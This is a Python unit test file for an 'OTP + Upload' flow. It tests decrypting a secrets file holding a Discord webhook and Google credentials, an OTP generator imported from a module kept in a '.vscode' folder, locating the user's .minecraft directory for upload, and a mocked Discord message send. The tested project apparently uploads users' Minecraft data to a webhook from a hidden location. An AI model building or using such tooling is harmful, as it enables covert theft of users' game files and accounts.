#!/usr/bin/env python3
"""End-to-end test for Branch 2: OTP + Upload flow."""

import os
import sys
import unittest
import tempfile
import shutil
import json
from unittest.mock import patch, MagicMock, Mock
import time

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Add .vscode to path for Defends.py
vscode_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.vscode')
sys.path.insert(0, vscode_path)

import config
import crypto_utils
import mc_utils
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64


class TestBranch2Flow(unittest.TestCase):
    """Test Nhanh 2: OTP + Upload flow."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.temp_dir, ignore_errors=True)
        self.secrets_path = os.path.join(self.temp_dir, 'secrets.enc')
        self.password = 'test_password_123'

    def _create_test_secrets(self):
        """Create a test secrets.enc file."""
        # Generate key
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
        key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
        f = Fernet(key)

        # Encrypt test data - format should be: discord_webhook\ngoogle_credentials_json
        test_data = 'https://discord.com/api/webhooks/test/test\n{"client_id": "test", "client_secret": "test"}'
        plaintext = test_data.encode('utf-8')
        encrypted = f.encrypt(plaintext)

        # Write with salt prefix
        with open(self.secrets_path, 'wb') as f_out:
            f_out.write(salt + encrypted)

    def test_decrypt_secrets_file_returns_dict(self):
        """Test that decrypt_secrets_file returns correct dict."""
        self._create_test_secrets()

        result = crypto_utils.decrypt_secrets_file(self.secrets_path, self.password)
        self.assertIn('discord_webhook', result)
        self.assertIn('google_credentials_json', result)
        self.assertEqual(result['discord_webhook'], 'https://discord.com/api/webhooks/test/test')

    @patch('time.time')
    def test_otp_generation_and_validation(self, mock_time):
        """Test OTP generation and validation flow."""
        from Defends import generate_otp, OTP_TIMEOUT

        # Mock time to return fixed values
        mock_time.return_value = 1000.0

        # Generate OTP
        otp1 = generate_otp()
        self.assertEqual(len(otp1), 4)
        self.assertTrue(all(c in '0123456789' for c in otp1))

        # After timeout, new OTP should be generated
        mock_time.return_value = 1000.0 + OTP_TIMEOUT + 1
        otp2 = generate_otp()
        self.assertEqual(len(otp2), 4)

    def test_mc_utils_finds_minecraft_for_upload(self):
        """Test that mc_utils can find Minecraft dir for upload."""
        # Create mock Minecraft structure in temp dir
        appdata = os.path.join(self.temp_dir, 'AppData', 'Roaming')
        mc_path = os.path.join(appdata, '.minecraft')
        os.makedirs(mc_path)

        # Mock environment - need to make sure find_minecraft_dir() doesn't find real paths
        # We need to mock os.environ to only have our temp dir
        with patch.dict(os.environ, {'APPDATA': appdata, 'LOCALAPPDATA': appdata, 'USERPROFILE': self.temp_dir}):
            result = mc_utils.find_minecraft_dir()
            self.assertEqual(result, mc_path)

    @patch('requests.post')
    def test_discord_message_sent(self, mock_post):
        """Test that Discord message is sent correctly."""
        from Defends import send_discord_message

        mock_response = Mock()
        mock_response.raise_for_status = Mock()
        mock_post.return_value = mock_response

        send_discord_message("Test message")
        mock_post.assert_called_once()
        call_args = mock_post.call_args
        self.assertIn('content', call_args[1]['json'])


if __name__ == '__main__':
    unittest.main(verbosity=2)
